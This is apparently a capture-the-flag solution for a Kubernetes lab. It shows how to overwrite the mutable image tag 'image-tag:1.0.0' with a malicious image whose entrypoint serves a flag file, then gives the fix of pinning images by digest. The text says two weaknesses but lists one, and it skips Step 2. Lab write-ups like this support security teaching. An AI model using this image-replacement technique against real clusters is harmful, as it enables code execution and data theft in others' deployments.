# Solution — 03 Image Tag

## Vulnerabilities

Two weaknesses chain together:

1. **Mutable image tag** — the deployment references `image-tag:1.0.0` with `imagePullPolicy: Always`. A version tag like `1.0.0` is not immutable; anyone who can load a new image into the cluster node can silently replace it.

## Exploit

### Step 1 — Build the malicious image

Create a working directory and write two files:

```sh
mkdir /temp/03-image-tag && cd /temp/03-image-tag
```

`Dockerfile`:

```dockerfile
FROM nginx:alpine
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```

`entrypoint.sh`:

```sh
#!/bin/sh
echo "<html><body><h1>$(cat /etc/ctf/flag)</h1></body></html>" \
  > /usr/share/nginx/html/index.html
exec nginx -g 'daemon off;'
```

Build under the same tag:

```sh
docker build --platform linux/amd64 -t image-tag:1.0.0 .
```

### Step 3 — Load the image into the cluster

```sh
kind load docker-image image-tag:1.0.0
```

This replaces the `image-tag:1.0.0` reference in the cluster node's containerd with your image.

### Step 4 — Wait for the pod to restart

The CronJob triggers `kubectl rollout restart` every minute. Within 60 seconds the old pod is replaced by a new one running your image.

```sh
curl http://localhost:8080
# <html><body><h1>ctf{...}</h1></body></html>
```

## Fix

Pin the image to its SHA256 digest in the Helm values — a digest is content-addressed and cannot be silently replaced:

```yaml
app:
  image:
    name: image-tag
    digest: "sha256:<digest>"
```

Deployment template:

```yaml
image: "{{ .Values.app.image.name }}@{{ .Values.app.image.digest }}"
```
